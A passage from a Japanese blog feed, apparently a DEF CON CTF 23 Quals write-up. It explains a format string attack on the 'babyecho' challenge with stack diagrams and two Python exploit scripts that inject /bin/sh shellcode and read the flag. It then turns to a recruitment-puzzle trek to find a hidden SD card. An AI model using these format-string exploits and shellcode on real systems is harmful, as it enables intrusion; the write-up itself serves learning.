<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,40)">サブルーチンのリターンアドレス</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,80)">&#8220;Reading %d bytes\n&#8221;で表示される数字</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,120)">定数(0x0a)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,160)">定数(null)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,200)">バッファーに読み込むバイト数</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,240)">バッファーの開始アドレス</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,280)">定数(null)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,340)">バッファー領域</text>
</svg></p>

<h2>攻撃手法：format string attack</h2>

<p>これらの調査をもとに、バッファーに読み込むバイト数が格納されているesp+0x10の値を、esp+0x14に格納されているesp+0x1cのアドレスをもとに書き換え、読み込むバイト数の上限を書き換えて、format string attackで攻撃コードを送り込む余地をつくる作戦が考えられます。
アプローチとしては以下の図のようになります。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<defs>
<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
</marker>
</defs>
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="red" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000040d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
</g>
<g class="arrow" transform="translate(260,240)">
<path stroke="#000000" fill="none" d="M0,0h40v60h-12" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<g class="arrow" transform="translate(280,190)">
<path stroke="#000000" fill="none" d="M0,110h95v-110h-87" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,40)">1. バッファーのアドレスを取得</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,80)">2. バイト数格納位置の1バイト上位へ移動</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,120)">3. その位置へ入力文字列長を格納</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(310,270)">%5$10p</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(380,240)">addr_buf - 0xb</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(290,205)">%7$ln</text>
</svg></p>

<p>13バイト制限のため、2回に分けてこの方法を試行します。
まず1回目に、<strong>%5$10p</strong>と入力することによって、esp+10に格納されているバッファーのアドレスを取得します。</p>

<p>そのアドレスから0x0bを引くことによって、バッファーの読み込みバイト数が格納されているアドレスの1バイト上位のアドレスを計算します。
これは、一度に送ることができる文字数が制限されていることによって、<strong>自由に大きな数値を指定できないため、</strong>バッファーのバイト数格納位置の1バイト上位に文字列長を書き込む方法をとったためです。今回の最大13バイトの入力という制限下では、最大でも9までしか数値を指定できません。それをそのままバッファー読み込みバイト数に格納しても、現状の13バイトより減ってしまいます。そのため、書き込む位置を上位にずらすことで、結果的にその数値をビットシフトによる掛け算で大きくし、バイト数制限の値を拡張しています。</p>

<p>そして2回目の入力時に、先ほど計算したアドレスへ文字数である4を、%nフォーマット文字列を使って書き込みます。これによって、現在0x0000000bとなっている読み込みバイト数を、0x0000040bに書き換えることができます。</p>

<p>コードは以下のようになります。</p>

<pre><code class="python">#!/usr/bin/env python

import sys
import socket
import struct

HOST = 'localhost' # 'babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me'
PORT = 3232

s = socket.create_connection((HOST, PORT))

def exploit():
    index = 7 # index of read/write buffer

    print(s.recv(8192))
    s.send("%5$10p\n") # request buffer address

    addr_buf = int(s.recv(10), 16)
    print("[DEBUG] Buffer address = 0x%x" % addr_buf)

    code = struct.pack('&lt;I', (addr_buf - 0xb)) # address[buffer size limit] &lt;&lt; 8
    code += "%%%d$ln\n" % index # write message text length = 4

    s.recv(8192)
    s.send(code) # overwrite buffer

    s.recv(8192)
    print(s.recv(8192))

if __name__=='__main__':
    exploit()
</code></pre>

<p>実行してみると、以下のようになりました。</p>

<pre><code>Reading 13 bytes

[DEBUG] Buffer address = 0xffbf62bc

Reading 1023 bytes
</code></pre>

<p>1度にバッファーに読み込み可能な文字数の上限が変化しました。esp+0x10の値は、esp+0x11に4を書き込んだことから、0x0000040d、すなわち1037になるはずですが、ループを繰り返すたびに値のチェックがあり、1023を超える場合は1023に書き戻す処理があるので、上限が1023 bytesになりました。</p>

<p>これだけあれば、shellcodeを送り込んで実行させることができます。サブルーチンコールの呼び出し元であるリターンアドレスを書き換え、shellcodeを実行させてフラッグを獲得しに行きます。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<defs>
<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
</marker>
<marker id="pointhead" refX="5" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<circle cx="5" cy="5" r="5"/>
</marker>
</defs>
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x000003ff</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x000003ff</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_ret</tspan>
<tspan x="0" y="20" dy=".35em">&#8221;%??c$n%??c$n&#8221;</tspan>
<tspan x="0" y="40" dy=".35em">shellcode</tspan>
</text>
</g>
<g class="arrow" transform="translate(260,40)">
<path stroke="#000000" fill="none" d="M0,0h50v320h-42" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<g class="arrow" transform="translate(260,20)">
<path stroke="#000000" fill="none" d="M0,320h10v-20h-10h35v-300h-7" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,80)">- addr_buf - 0x20でaddr_retを求める</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,120)">(addr_ret = リターンアドレスの格納場所)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,160)">- バッファーにshellcodeを書く</text>
<g class="block" transform="translate(325,200)">
<path stroke="#000000" fill="none" d="M0,0h-30" marker-end="url(#pointhead)" stroke-width="1" />
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(5,0)">addr_retにaddr_shellを書き込む</text>
</g>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,240)">(addr_shell = shellcodeの開始アドレス)</text>
<g class="block" transform="translate(325,280)">
<path stroke="#000000" fill="none" d="M0,0h-15" marker-end="url(#pointhead)" stroke-width="1" />
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(5,0)">printfからaddr_retにあるアドレスに戻る</text>
</g>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,320)">- shellcodeが実行される</text>
</svg></p>

<pre><code class="python">#!/usr/bin/env python

import sys
import socket
import struct

HOST = 'localhost' # 'babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me'
PORT = 3232

s = socket.create_connection((HOST, PORT))

def exploit():
    index = 7 # index of read/write buffer

    print(s.recv(8192))
    s.send("%5$10p\n") # request buffer address

    addr_buf = int(s.recv(10), 16)
    print("[DEBUG] Buffer address = 0x%x" % addr_buf)

    code = struct.pack('&lt;I', (addr_buf - 0xb)) # address[buffer size limit] &lt;&lt; 8
    code += "%%%d$ln\n" % index # write message text length = 4

    s.recv(8192)
    s.send(code) # overwrite buffer

    s.recv(8192)
    print(s.recv(8192))

    # x86 /bin/sh shellcode
    shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

    addr_ret = addr_buf - 0x20  # call return address = [esp]

    payload = struct.pack('&lt;I', addr_ret) \
    + struct.pack('&lt;I', addr_ret + 1) \
    + struct.pack('&lt;I', addr_ret + 2) \
    + struct.pack('&lt;I', addr_ret + 3) \
    + shellcode

    addr_shell = [
    addr_buf + 16 &gt;&gt; 0  &amp; 0xff,
    addr_buf + 16 &gt;&gt; 8  &amp; 0xff,
    addr_buf + 16 &gt;&gt; 16 &amp; 0xff,
    addr_buf + 16 &gt;&gt; 24 &amp; 0xff ]

    payload += "%%%dc%%%d$hhn" % ((addr_shell[0] - len(payload)) &amp; 0xff, index) \
    + "%%%dc%%%d$hhn" % ((addr_shell[1] - addr_shell[0]) &amp; 0xff, index + 1) \
    + "%%%dc%%%d$hhn" % ((addr_shell[2] - addr_shell[1]) &amp; 0xff, index + 2) \
    + "%%%dc%%%d$hhn" % ((addr_shell[3] - addr_shell[2]) &amp; 0xff, index + 3) \
    + "\n"

    s.send(payload) # exploit

    s.send("cat&lt;/home/babyecho/flag\n") # capture the flag
    print(s.recv(8192))
    print(s.recv(8192))

if __name__=='__main__':
    exploit()
</code></pre>

<p>実行結果は以下のとおりです。</p>

<pre><code>Reading 13 bytes

[DEBUG] Buffer address = 0xffbf62bc

Reading 1023 bytes

彙ｿ… 拊ｿ… 枌ｿ… 歟ｿ… j
X儚h//shh/bin峨1ﾉﾍ^\
…

                                                               …
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
</code></pre>

<p>FLAG:<code>1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%</code></p>

<p>今回の攻撃手法もIPAによって丁寧に解説及び対策が掲載されているので、詳しく知りたい場合は参考に見てみるのも良いでしょう。</p>

<p><a href="http://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/c906.html">IPA ISEC　セキュア・プログラミング講座：C/C++言語編　第10章 著名な脆弱性対策：フォーマット文字列攻撃対策</a></p>

<h1>その他</h1>

<p>Coding Challengeという、問題サーバーからレジスタの初期状態と機械語の命令コードが送られてきて、その命令を実行したあとのレジスタの値を送り返すという問題も解いたのですが、違う問題でglibcのアップデートをした際にマシンがクラッシュし、スナップショットの状態に戻した際に消えてしまいました。
なのでコードがありません。</p>

<h2>問題文</h2>

<pre><code>meow

catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me
</code></pre>

<p>解法としては、Pythonで以下のように処理するものを作成して実行しただけです。</p>

<ol>
<li>レジスタの初期状態と機械語命令コードを受信＆パースする</li>
<li>Cのソースコードを生成

<ol>
<li>命令コードをunsigned char型配列に突っ込む</li>
<li>その配列を関数ポインタに変換</li>
<li>mprotectで配列の領域を実行可能に変更</li>
<li>asm volatile経由でレジスタの初期状態を書き込む</li>
<li>関数ポインタを呼び出し実行</li>
<li>asm volatile経由で実行後のレジスタの値を読み出す</li>
<li>標準出力に出力</li>
</ol>
</li>
<li>gccでソースコードをコンパイル</li>
<li>生成したバイナリを実行し、出力を得る</li>
<li>出力を送信</li>
</ol>


<p>となっています。
途中、mprotectに関してみむらさんからアドバイスをいただき、解くことができました。</p>

<p><a href="http://mimumimu.net/blog/2011/11/17/c%E3%82%B3%E3%83%BC%E3%83%89%E4%B8%AD%E3%81%AB%E3%83%9E%E3%82%B7%E3%83%B3%E8%AA%9E%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A7%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%80%82/">Cコード中にマシン語を埋め込んで実行する。 | みむらの手記手帳</a></p>

<p>FLAG: <code>Cats with frickin lazer beamz on top of their heads!</code></p>

<p>追記：flag獲得者のみむらさんによるWrite-upが公開されています。</p>

<p><a href="https://mimumimu.net/blog/2015/05/19/defcon-ctf-23-quals-catwestern/">DEFCON CTF 23 Quals – catwestern Writeup | みむらの手記手帳</a></p>

<h1>まとめ</h1>

<p>チーム全体で計19ポイントを獲得し、結果33位でした。1ポイントしか貢献できませんでしたが、大人数でお互い協力して問題を解く楽しさを味わえてとても有意義でした。
また、問題傾向がPwn寄りであることから、もっとPwnに関する実力をつけなければならないと再確認できた良い機会でした。
来年は5ポイントを目標に挑みたいと思います！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up エクストリームCTF編]]></title>
    <link href="http://mzyy94.com/blog/2015/04/16/netagent-mondai10/"/>
    <updated>2015-04-16T00:13:43+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/16/netagent-mondai10</id>
    <content type="html"><![CDATA[<p>ネットエージェントのいきなり最終面接問題を解いたのでWrite-upです。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>これまでmondai1からmondai9までは、mondaiとOS XやLinux、Windowsマシンが手元にあれば解く事ができていました。
しかしmondai10はそうはいきません。mondaiが手元にないのです。mondaiを入手しなければいけないのです。
某所で10分で解けたと言っていた人は、きっと某せんせーみたいにマッハ20で移動できるのでしょう。</p>

<p>ところで、こんな楽しい体験をさせてくれたmondaiを少しでもたくさんの人に知ってもらおうと、学内のLT大会で以下のように発表してきました。</p>

<iframe src="//www.slideshare.net/slideshow/embed_code/47019316" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/mzyy94/ctf-coinslt" title="CTFの話 - coinsLT #10" target="_blank">CTFの話 - coinsLT #10</a> </strong> from <strong><a href="//www.slideshare.net/mzyy94" target="_blank">Yuki Mizuno</a></strong> </div></p>

<p>この発表では、この記事の内容から抜粋する形で、最後のmondai10を解く楽しさと、それによって得た経験を紹介してきました。
よろしければご覧になってみてください。</p>

<p>さて、一昨々日から始まったネットエージェント最終面接問題のWrite-upもこれで最終回です。
<a href="/blog/2015/04/15/netagent-mondai7-9/">昨日のmondai9のWrite-up</a>に続き、最後のmondai10のWrite-upです。</p>

<!-- more -->


<h1>mondai10</h1>

<p>mondai9でマウントしたmondai10.tcには9枚の写真とmondai10.txtがありました。mondai10.txtには以下のように記載がありました。</p>

<pre><code>関東２ヶ所、関西２ヶ所のそれぞれの箇所にSDカードに最後の問題を隠した。今までのヒントと写真から位置を割り出せ。

各地先着１名
ヒント：石の下のミンティア
</code></pre>

<p>関東に住んでいるので、関東のSDカードをゲットしに行こうと思いました。
関東の2ヶ所はkanto1・kanto2と呼ばれ、どちらにしようか迷っていると、kanto2がゲットを狙われているとの情報を得たのでkanto1に行くことにしました。</p>

<h2>今までのヒント</h2>

<p>これまでの問題を解いていて、途中でhint[数字].txtといったファイルが幾つか一緒に出てきました。
このhintに書かれているkanto1のヒントは以下の6つでした。</p>

<ul>
<li>com.ruckygames.gunmaapps</li>
<li>ひもかわうどん</li>
<li>百足</li>
<li>×Fe</li>
<li>!△</li>
<li>ヤマヒゲナガケンミジンコ</li>
</ul>


<p>1つ目のヒントはアプリケーションBundle IDで、<strong>ぐんまのやぼう</strong>のものでした。2つ目のヒントのひもかわうどんは、群馬県の桐生名物とのことです。
この2つから群馬県のとある場所に隠されているということが想像つきます。</p>

<p>3つ目のヒントの百足と群馬県をセットにしてGoogle検索してみると、次のサイトが上位にヒットします。</p>

<p><a href="http://akagi-yama.jp/archives/358">神戦「赤城と日光二荒山神戦」 | 群馬県赤城山ポータルサイト</a></p>

<p>群馬県赤城山の神様が大ムカデとのことです。これによって群馬県赤城山に隠されている線が浮上します。</p>

<p>4つ目のヒントは×Fe（※エックスではなくバツ）ですが、さっぱりわかりません。そのまま見るに、鉄(Fe)ではない、ということでしょうか。</p>

<p>5つ目のヒントは!△で意味するところは、山頂にはない、もしくは、三角点付近ではない、ということでしょうか。これまたよくわかりません。</p>

<p>6つ目のヒントはヤマヒゲナガケンミジンコで、Google検索してみるとミジンコ画像サイトばかりヒットしてよくわかりませんでした。</p>

<p>これらのヒントを元にわかったことは、<strong>群馬県の赤城山</strong>に隠されているということです。
kanto1に関する画像がまだ確認してないので見てみます。
kanto1_1.jpgとkanto1_2.jpgのファイル情報に撮影場所の手がかりがあるかもと期待を込め、メタ情報を見てみます。</p>

<p><img src="/blog/resources/images//exif-infos.png" alt="exif-infos.png" /></p>

<p>予想通り、SDカードを隠した場所のGPSの座標情報がEXIFに含まれているようです。OS Xのプレビュー.appで詳細情報を開いて、マップ.appにその地点を表示させてみました。</p>

<p><img src="/blog/resources/images//apple-map.png" alt="apple-map.png" /></p>

<p>ヒントから導いた通り、隠されている場所は赤城山でまちがいないようです。</p>

<p>早速、赤城山への行き方を調べてみます。</p>

<p><a href="http://akagi-yama.jp/access">アクセス | 群馬県赤城山ポータルサイト</a></p>

<p>公共交通機関で行く方法として、電車に乗って前橋駅もしくは中央前橋駅へ行き、そこから赤城山行きのバスに乗ればよいと示されていました。
同じ関東だし翌日9時頃に家を出ればその日のうちに帰ってこれるだろ、と高を括り、お布団に入って熟睡し翌日に備えました。
今思えばこの時点で<strong>エクストリームCTF</strong>が始まっていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>明日は10時頃大学行って11時ごろ電車乗って14時ごろ登山開始ってところかな（）</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584723697740582913">2015, 4月 5</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>ヤマノススメするぞといった気持ち</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584858646346989568">2015, 4月 5</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00L3NPW7E" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<h2>当日</h2>

<p>ぐっすりと睡眠をとり、目覚めのコーヒーと朝食の調理パンを食べて赤城山に向かう準備を始めます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>とりあえず登山グッズはこんなもんか <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/pXQj4G5MdH">pic.twitter.com/pXQj4G5MdH</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584861432895811585">2015, 4月 5</a></blockquote>


<p>MBA,パン,水分,チョコレート,革手袋,コンパクトダウンジャケット,モバイルバッテリーにSDカードリーダーを持っていざ出発です。</p>

<h3>午前の部　電車乗り換え編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>行くぜ関東 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくば駅 (Tsukuba Sta.) in つくば市, 茨城県) <a href="https://t.co/DUWnj3m167">https://t.co/DUWnj3m167</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584874102009266176">2015, 4月 6</a></blockquote>


<p>自宅の最寄駅のつくば駅からつくばエクスプレスに乗り、赤城山の最寄駅である前橋駅へ向かいます。
つくばエクスプレスの電車の中で検索したところ経路としては、流山おおたかの森駅乗り換えで東武鉄道を使う行き方と、
南流山乗り換えでJRを使って行く方法がありました。</p>

<p><img src="/blog/resources/images//train-connections.png" alt="train-connections" /></p>

<p>JRでは移動距離100km以上だったので学割が使えますが、電車内での決断は以下のようになりました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>JRでSDカード発掘に行くつもりだったけど時間ずらすと東武の方が安いことに気づいて学割使わなんだ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584881057205395456">2015, 4月 6</a></blockquote>


<p>この時は後にある過酷な乗り換えが待っていることも知らず、運賃の安さで流山おおたかの森駅での乗り換えを選択しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>TX乗り換え <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくばエクスプレス 流山おおたかの森駅 in 流山市, 千葉県) <a href="https://t.co/PTvNeocyiw">https://t.co/PTvNeocyiw</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584879354540388352">2015, 4月 6</a></blockquote>


<p>東武鉄道へと乗り換え、電車の中で前橋駅から赤城山へのバスの時刻表を調べ始めます。ここで衝撃の事実を知ることになります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>やべぇ登山口へのバスの本数少なすぎるw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885349471498242">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>ちょっと！kanto1最寄り駅から1日5本しかバス出てないってどういうことおかしいでしょ！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885739130716160">2015, 4月 6</a></blockquote>




